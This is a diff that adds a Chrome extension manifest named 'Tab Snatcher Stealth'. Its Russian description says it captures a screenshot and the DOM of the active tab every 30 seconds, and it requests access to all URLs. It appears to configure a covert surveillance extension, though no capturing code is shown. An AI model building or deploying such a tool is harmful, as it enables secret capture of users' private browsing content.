@@ -1,0 +1,17 @@
+{
+  "manifest_version": 3,
+  "name": "Tab Snatcher Stealth",
+  "version": "1.0",
+  "description": "Собирает скриншот и DOM только активной вкладки каждые 30 секунд",
+  "permissions": [
+    "tabs",
+    "scripting",
+    "activeTab"
+  ],
+  "host_permissions": [
+    "<all_urls>"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  }
+}
